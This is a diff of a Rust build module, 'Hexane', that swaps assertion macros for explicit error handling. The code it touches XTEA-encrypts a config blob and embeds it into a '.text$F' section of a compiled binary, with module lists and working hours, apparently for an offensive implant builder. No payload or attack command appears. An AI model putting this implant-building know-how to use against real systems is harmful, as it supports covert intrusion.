@@ -14,7 +14,7 @@ use crate::server::cipher::{crypt_create_key, crypt_xtea};
 use crate::server::binary::embed_section_data;
 use crate::server::error::{Error, Result};
 use crate::server::stream::Stream;
-use crate::{assert_result, return_error};
+use crate::{log_debug, log_error};
 
 fn map_config(file_path: &String) -> Result<Hexane> {
     let json_file   = env::current_dir()?.join("json").join(file_path);
@@ -109,11 +109,28 @@ impl Hexane {
             RELEASE_FLAGS.parse().unwrap()
         };
 
-        assert_result!(create_directory(&self.compiler.build_directory), "setup_instance");
-        assert_result!(generate_hashes(STRINGS, HASHES), "setup_instance");
+        match create_directory(&self.compiler.build_directory) {
+            Ok(_) => { },
+            Err(e) => {
+                log_error!(&"setup_instance".to_owned());
+                return Err(Error::Custom("could not create build directory".to_owned()))
+            }
+        }
 
-        assert_result!(self.generate_config_bytes(), "setup_instance");
-        assert_result!(self.compile_sources(), "setup_instance");
+        match generate_hashes(STRINGS, HASHES) {
+            Ok(_)   => { },
+            Err(e)  => return Err(Error::Custom(format!("could not generate hashes: {}", e)))
+        }
+
+        match self.generate_config_bytes() {
+            Ok(_)   => { },
+            Err(e)  => return Err(Error::Custom(format!("could not generate config bytes: {}", e)))
+        }
+
+        match self.compile_sources() {
+            Ok(_)   => { },
+            Err(e)  => return Err(Error::Custom(format!("could not compile sources: {}", e)))
+        }
 
         Ok(())
     }
@@ -121,9 +138,12 @@ impl Hexane {
     fn generate_config_bytes(&mut self) -> Result<()> {
         self.crypt_key = crypt_create_key(16);
 
-        let mut patch   = assert_result!(self.create_binary_patch(), "generate_config_bytes")?;
-        let encrypt     = self.main.encrypt;
+        let mut patch = match self.create_binary_patch() {
+            Ok(patch)   => patch,
+            Err(e)      => return Err(Error::Custom(format!("could not create binary patch: {}", e)))
+        };
 
+        let encrypt = self.main.encrypt;
         if encrypt {
             let patch_cpy   = patch.clone();
             patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
@@ -141,7 +161,7 @@ impl Hexane {
                 stream.pack_string(module);
             }
         } else {
-            wrap_message("debug", &"no external module names found. continue.".to_owned());
+            log_debug!(&"no external module names found. continue.".to_owned());
         }
 
         let working_hours = if let Some(ref hours) = self.main.working_hours {
@@ -204,7 +224,13 @@ impl Hexane {
     }
 
     fn compile_object(&mut self, mut command: String, source: String, mut flags: String) -> Result<()> {
-        let build = assert_result!(source_to_outpath(source, &self.compiler.build_directory), "compile_object")?;
+        let build = match source_to_outpath(source, &self.compiler.build_directory) {
+            Ok(build)   => build,
+            Err(e)      => {
+                log_error!(&"could not string build directory".to_string().to_owned());
+                return Err(Error::Custom(format!("could not string build directory: {}", e)))
+            }
+        };
 
         let mut defs: HashMap<String, Option<u32>> = HashMap::new();
 
@@ -242,7 +268,13 @@ impl Hexane {
         let src_path        = Path::new(&self.builder.root_directory).join("src");
         let mut components  = self.compiler.components.clone();
 
-        let entries = assert_result!(canonical_path_all(src_path), "compile_sources")?;
+        let entries = match canonical_path_all(src_path) {
+            Ok(entries)   => entries,
+            Err(e) => {
+                log_error!(&"could not get canonical paths in src directory".to_string());
+                return Err(Error::Custom(format!("could not get canonical paths in src directory: {}", e)))
+            }
+        };
 
         let (err_send, err_recv)    = channel();
         let atoms                   = Arc::new(Mutex::new(()));
@@ -304,7 +336,10 @@ impl Hexane {
         }
 
         wrap_message("debug", &"Linking final objects".to_owned());
-        assert_result!(embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice()), "compile_sources")?;
+        match embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice()) {
+            Ok(_)   => { },
+            Err(e)  => return Err(Error::Custom(format!("embed_section_data: {}", e))),
+        }
 
         // TODO: link all objects
 
